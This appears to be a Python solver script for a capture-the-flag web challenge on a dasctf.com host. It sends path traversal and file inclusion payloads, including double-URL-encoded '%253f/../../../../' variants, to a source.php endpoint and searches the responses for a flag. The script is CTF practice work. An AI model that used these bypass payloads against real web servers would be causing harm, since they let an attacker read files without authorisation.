# -*- coding: utf-8 -*-
"""看追加内容的完整尾部"""
import requests, re

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

tests = [
    ('file=hint.php', 'hint.php'),
    ('file=source.php?/../../../../ffffllllaaaagggg', 'source.php?/../../../../ffffllllaaaagggg'),
    ('file=source.php%253f/../../../../ffffllllaaaagggg', 'source.php%253f/../../../../ffffllllaaaagggg'),
    ('file=hint.php%253f/../../../../ffffllllaaaagggg', 'hint.php%253f/../../../../ffffllllaaaagggg'),
]

for label, f in tests:
    r = requests.get(base + '/source.php', params={'file': f}, timeout=12)
    print(f'=== {label} (len={len(r.text)}) ===')
    # </code> 之后的内容（追加部分）
    idx = r.text.find('</code>')
    if idx != -1:
        tail = r.text[idx+7:]
        print(f'追加部分({len(tail)}): {tail[:300]}')
    else:
        print(f'无 </code>，尾部: {r.text[-200:]}')
    flags = re.findall(r'flag\{[^}]+\}', r.text)
    if flags:
        print(f'🏁 FLAG: {flags[0]}')
    print()
